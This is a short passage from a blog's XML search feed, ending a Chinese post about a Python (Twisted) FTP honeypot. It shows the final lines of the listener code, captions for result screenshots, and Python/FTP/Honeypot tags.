FtpFactory(Factory): def buildProtocol(self, addr): return Ftp()reactor.listenTCP(21, FtpFactory())reactor.run() 0x02结果截图1.浏览器的登录界面展示 2.Telnet连接界面 3.记录的日志]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Ftp</tag>
        <tag>Honeypot</tag>
      </tags>
  </entry>
</search>
